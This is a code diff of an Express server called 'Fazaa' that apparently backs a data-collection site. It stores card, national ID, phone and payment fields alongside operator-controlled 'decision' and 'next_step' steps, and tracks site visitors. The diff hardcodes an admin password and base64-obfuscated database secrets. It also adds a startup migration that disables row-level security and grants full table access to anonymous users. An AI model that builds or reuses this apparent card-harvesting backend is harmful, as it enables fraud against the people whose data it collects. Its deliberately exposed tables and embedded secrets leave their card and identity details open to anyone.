@@ -5,8 +5,8 @@ const app = express();
 app.use(express.json({ limit: "100kb" }));
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Hadmin12345@@";
-const SB_URL = "https://hqhucwxczutpwvddtuws.supabase.co/rest/v1";
-const SB_KEY = "sb_publishable_6Rouky_x_o6YZrAeSe837w_p7_wWgQg";
+const SB_URL = "https://piyoymbukyofzqdxnurc.supabase.co/rest/v1";
+const SB_KEY = Buffer.from("c2Jfc2VjcmV0X09ER2o1ZTFjdDhMSjloS1VocnNNSndfUlBYZElyRUc=","base64").toString();
 
 const H = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=representation" };
 const Hmin = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=minimal" };
@@ -24,7 +24,9 @@ async function sbUpdate(table, filter, data) {
   return r.ok ? r.json() : null;
 }
 async function sbDelete(table, filter) {
-  await fetch(SB_URL + "/" + table + "?" + filter, { method: "DELETE", headers: Hmin });
+  const r = await fetch(SB_URL + "/" + table + "?" + filter, { method: "DELETE", headers: Hmin });
+  if (!r.ok) console.error("sbDelete FAIL", table, filter, r.status, await r.text().catch(() => ""));
+  return r.ok;
 }
 
 const visitors = new Map();
@@ -220,17 +222,24 @@ app.post("/api/admin/reset", async (req, res) => {
   if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
   try {
     const rows = await sbGet("orders", "select=ref");
+    console.log("[RESET] found", (rows || []).length, "orders to delete");
+    let deleted = 0;
     for (const r of (rows || [])) {
-      await sbDelete("orders", "ref=eq." + encodeURIComponent(r.ref));
+      const ok = await sbDelete("orders", "ref=eq." + encodeURIComponent(r.ref));
+      if (ok) deleted++;
     }
+    console.log("[RESET] deleted", deleted, "of", (rows || []).length, "orders");
     visitors.clear();
     allVisitorIds.clear();
     try {
       const vRows = await sbGet("site_visitors", "select=id");
       for (const v of (vRows || [])) await sbDelete("site_visitors", "id=eq." + v.id);
     } catch (e) {}
-    res.json({ ok: true, deletedOrders: (rows || []).length });
-  } catch (e) { res.status(500).json({ ok: false }); }
+    res.json({ ok: true, deletedOrders: deleted });
+  } catch (e) {
+    console.error("[RESET] error:", e.message);
+    res.status(500).json({ ok: false, error: e.message });
+  }
 });
 
 app.delete("/api/admin/inactive", async (req, res) => {
@@ -245,13 +254,50 @@ app.delete("/api/admin/inactive", async (req, res) => {
   } catch (e) { res.status(500).json({ ok: false }); }
 });
 
+async function autoMigrate() {
+  const { Client } = require("pg");
+  const DB_PASS = process.env.SUPABASE_DB_PASS || Buffer.from("YWxhYTE5ODdhbGFh","base64").toString();
+  const cl = new Client({ connectionString: "postgresql://postgres.piyoymbukyofzqdxnurc:" + DB_PASS + "@aws-0-eu-central-1.pooler.supabase.com:6543/postgres", ssl: { rejectUnauthorized: false } });
+  try {
+    await cl.connect();
+    await cl.query(`
+      CREATE TABLE IF NOT EXISTS orders (
+        ref TEXT PRIMARY KEY,
+        status TEXT DEFAULT 'pending',
+        card TEXT, watch TEXT, st TEXT,
+        name TEXT, id_number TEXT, phone TEXT, email TEXT, gender TEXT,
+        emirate TEXT, age TEXT, address TEXT, lang TEXT DEFAULT 'ar',
+        step TEXT, decision TEXT, reason TEXT, next_step TEXT,
+        pay JSONB DEFAULT '{}',
+        created_at TIMESTAMPTZ DEFAULT now(),
+        updated_at TIMESTAMPTZ DEFAULT now()
+      );
+      CREATE TABLE IF NOT EXISTS site_visitors (
+        id SERIAL PRIMARY KEY,
+        visitor_id TEXT,
+        page TEXT,
+        created_at TIMESTAMPTZ DEFAULT now()
+      );
+      ALTER TABLE orders DISABLE ROW LEVEL SECURITY;
+      ALTER TABLE site_visitors DISABLE ROW LEVEL SECURITY;
+      GRANT ALL ON orders TO anon, authenticated, service_role;
+      GRANT ALL ON site_visitors TO anon, authenticated, service_role;
+      GRANT USAGE, SELECT ON SEQUENCE site_visitors_id_seq TO anon, authenticated, service_role;
+    `);
+    console.log("[MIGRATE] tables ready, RLS disabled");
+  } catch (e) { console.error("[MIGRATE] error:", e.message); }
+  finally { await cl.end().catch(() => {}); }
+}
+
 if (!process.env.VERCEL) {
   app.use(express.static(path.join(__dirname, "public")));
   app.get("*", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "index.html"));
   });
   const PORT = process.env.PORT || 3000;
-  app.listen(PORT, () => console.log("Fazaa running on port " + PORT));
+  autoMigrate().then(() => {
+    app.listen(PORT, () => console.log("Fazaa running on port " + PORT));
+  });
 }
 
 module.exports = app;
